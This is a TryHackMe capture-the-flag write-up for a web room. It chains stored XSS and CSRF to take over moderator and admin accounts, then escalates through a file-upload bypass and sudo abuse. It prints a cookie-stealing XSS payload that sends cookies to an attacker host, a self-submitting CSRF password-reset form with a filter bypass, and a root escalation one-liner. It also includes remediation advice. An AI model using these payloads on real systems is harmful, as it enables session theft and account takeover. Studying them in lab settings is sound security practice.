# Whats Your Name? — TryHackMe Writeup

> **Room:** [Whats Your Name?](https://tryhackme.com/room/whatsyourname) · **Difficulty:** Medium
> **Category:** Web / Client-side exploitation · **Author of writeup:** 0xnyx
> **Goal:** Use XSS and CSRF to take over the web app (moderator, then admin).

> ⚠️ In line with TryHackMe's write-up policy, **no flags or passwords are included** — only the methodology.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

- **22/tcp** — OpenSSH
- **80/tcp** — Apache, served from `/public/html/`
- **8081/tcp** — Apache (secondary)

Nmap also flags `PHPSESSID` with **`httponly` not set** → cookies are readable from JS,
so a successful XSS can steal sessions.

Add the hostnames to `/etc/hosts`:

```
<TARGET> worldwap.thm login.worldwap.thm
```

## 2. The registration API

The register page's JS (`register.js`) reveals the API:

```js
fetch('../../api/register.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json',
             'X-THM-API-Key': '<api-key-hardcoded-in-js>' },
  body: JSON.stringify({ username, password, email, name })
});
```

The challenge states new registrations are **reviewed by a moderator** — a stored-XSS
delivery channel.

## 3. Flag 1 — stored XSS → moderator session theft

Register an account with a **cookie-stealer payload in the `name` field**. When the
moderator reviews it, the script runs in their browser and exfiltrates their cookie:

```html
<script>fetch("http://<ATTACKER>:<PORT>/?c="+btoa(document.cookie))</script>
```

Run a listener (`php -S 0.0.0.0:<PORT>`) and wait for the callback. Because the moderator
session rotates quickly, it's cleanest to have the catcher **immediately re-use** the stolen
cookie server-side to fetch the moderator's page. The **first flag** appears in the header
of the moderator's profile on `login.worldwap.thm/profile.php`.

## 4. Flag 2 — CSRF via chat → admin password reset

The moderator area links to a chat (`chat.php`) and a password-change page
(`change_password.php`). `change_password.php` takes a `new_password` POST parameter and
has **no CSRF token**. The chat renders messages to whoever views them (including the admin).

Plant a self-submitting CSRF form in a chat message aimed at the admin. String
concatenation (`'ht'+'tp://'`) bypasses the chat's URL-formatting filter:

```html
<script>
window.onload = function () {
  var f = document.createElement('form');
  f.method = 'POST';
  f.action = 'ht'+'tp://login.worldwap.thm/change_password.php';
  var i = document.createElement('input');
  i.type = 'hidden'; i.name = 'new_password'; i.value = '<chosen-pw>';
  f.appendChild(i); document.body.appendChild(f); f.submit();
};
</script>
```

When the admin views the chat, their browser silently changes the admin password to a value
we chose. Log in as `admin` with that password — the **second flag** is in the admin
profile header.

## 5. Bonus — RCE to root

Moderators can upload files (`upload.php`). A pure PHP upload is blocked, but prepending PNG
**magic bytes** (`89 50 4E 47 0D 0A 1A 0A`) and abusing a null-byte in the filename
(`shell.phpD.png`, with `D` → null in Burp) bypasses both the extension and content checks.
Request the uploaded file to trigger a `www-data` shell, then escalate:

```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'   # sudo abuse -> root
```

---

## Lessons

- `httponly` not set + a bot that reviews user content = **stored XSS → session theft**.
- Auto-reuse a stolen cookie server-side when sessions rotate fast.
- No CSRF token on a state-changing POST = **CSRF**; combine with stored XSS to hit a privileged victim.
- URL/keyword filters fall to **string concatenation** (`'ht'+'tp'`).
- Upload filters: combine **magic-byte spoofing** + extension/null-byte tricks.

## Remediation

- Set `HttpOnly` + `Secure` on session cookies; add a strict CSP.
- Output-encode all user content; never render raw HTML from users.
- Add CSRF tokens (and re-auth) to password changes.
- Validate uploads by content, store outside the web root, and never execute user uploads.

---

*Write-up for [TryHackMe — Whats Your Name?](https://tryhackme.com/room/whatsyourname).*
